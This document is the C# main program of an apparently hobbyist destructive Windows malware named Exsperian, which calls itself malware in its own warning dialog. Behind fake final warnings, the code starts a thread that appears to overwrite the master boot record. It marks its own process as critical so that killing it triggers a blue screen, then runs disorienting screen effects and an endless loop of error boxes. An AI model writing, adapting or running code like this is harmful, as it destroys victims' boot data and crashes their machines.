using NAudio.Wave;
using System;
using static Vanara.PInvoke.Kernel32;
using static Vanara.PInvoke.User32;
using System.Threading;
using Vanara.PInvoke;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace Exsperian
{
    public class Program
    {
        public static void cls()
        {
            for (int num = 0; num < 10; num++)
            {
                InvalidateRect(IntPtr.Zero, null, true);
                InvalidateRect(IntPtr.Zero, null, true);
            }
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr processHandle, int processInformationClass, ref int processInformation, int processInformationLength);

        private const int BreakOnTermination = 0x1D;
        private static int isCritical = 1;

        public static void bsod()
        {
            Process.EnterDebugMode();
            IntPtr handle = Process.GetCurrentProcess().Handle;
            NtSetInformationProcess(handle, BreakOnTermination, ref isCritical, sizeof(int));
        }

        public static void Main()
        {
            // ByteBeats
            var som1 = new Beat1();
            var som2 = new Beat2();
            var som3 = new Beat3();
            var som4 = new Beat4();

            var wave = new WaveOut();

            /*-----------------------------------------------*/

            Application.Run(new MsgWarning());
            var mg = System.Windows.Forms.MessageBox.Show("THIS IS THE LAST WARNING, YOU ARE 100% SURE THAT YOU WANT TO RUN THIS MALWARE AND THAT (CYBERWARE) WILL NOT BE HELD RESPONSIBLE FOR ANY DAMAGES CAUSED",
                $"{Application.ProductName} - FINAL WARNING!!", // I fixed the title of the message that had 2 .exe files (.exe.exe) - PTBR { Arrumei o Titulo do Msg Que Estava com 2 .exe (.exe.exe ) }
                MessageBoxButtons.YesNo,
                MessageBoxIcon.Warning);
            if (mg == DialogResult.No)
            {
                return;
            }

            /*===============================================================*/

            // Threads

            Thread SpiralIcons = new Thread(IconsSpiral.CuboDeIcons);
            Thread LsdEffect1 = new Thread(LsdEffects.EfeitoLSDExtreme);
            Thread EffectTexts = new Thread(Carga.EffectPay1);
            Thread EffectLsd2 = new Thread(LsdEffects.Lsd2EffectHole);
            Thread Effect2HoleRgb = new Thread(Carga.EffectPay2);
            Thread Effect3Lsd = new Thread(LsdEffects.Lsd3);
            Thread Effect3PayCargas = new Thread(Carga.EffectPay3);
            Thread Effect4Illusion = new Thread(Carga.EffectPay4);
            Thread EffectSpecialMandelbrot = new Thread(SpecialEffects.EffectZoomMandelbrot);
            Thread EffectPay5 = new Thread(Carga.EffectPay5);
            Thread EffectPay6End = new Thread(Carga.EffectPay6);

            /*===============================================================*/

            Thread mbr = new Thread(MbrInit.MbrStart);
            mbr.Start();
            bsod();        // Se Caso o Usuário Tentar Desligar ou Matar o Processo do App ele Da Tela Azul !! ( If the user tries to turn off or kill the app process, it gives a blue screen!! )

            // Program

            Sleep(5000);

            wave.Init(som1);
            wave.Play();
            SpiralIcons.Start();
            Sleep(3500);
            LsdEffect1.Start();

            Sleep(1000 * 10); // 10s

            cls();

            SpiralIcons.Abort();
            EffectTexts.Start();

            Sleep(1000 * 15); // 15s

            cls();

            wave.Stop();
            wave.Init(som2);
            wave.Play();

            EffectTexts.Abort();
            LsdEffect1.Abort();
            EffectLsd2.Start();
            Sleep(1000 * 10);     // 10s
            EffectLsd2.Abort();
            Effect2HoleRgb.Start();

            Sleep(1000 * 15);       // 15s

            cls();

            Effect2HoleRgb.Abort();
            Effect3Lsd.Start();
            Sleep(1000 * 10);
            cls();
            Effect3PayCargas.Start();
            Sleep(1000 * 10);       // 10s
            Effect3Lsd.Abort();
            cls();
            Sleep(5000);
            Effect3PayCargas.Abort();
            Effect4Illusion.Start();

            Sleep(1000 * 10);

            Effect4Illusion.Abort();
            cls();
            cls();
            wave.Stop();
            wave.Init(som3);
            wave.Play();
            EffectSpecialMandelbrot.Start();

            Sleep(1000 * 57);

            EffectSpecialMandelbrot.Abort();
            wave.Stop();
            wave.Init(som4);
            cls();
            cls();

            Sleep(3000);

            wave.Play();
            EffectPay5.Start();
            Sleep(1000 * 9);

            EffectPay5.Abort();
            cls();
            EffectPay6End.Start();

            while (true)
                System.Windows.Forms.MessageBox.Show("????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????",
                    "????????????????????????????????????????????",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Error,
                    MessageBoxDefaultButton.Button1,
                    MessageBoxOptions.ServiceNotification);

            Sleep(INFINITE);
        }
    }
}
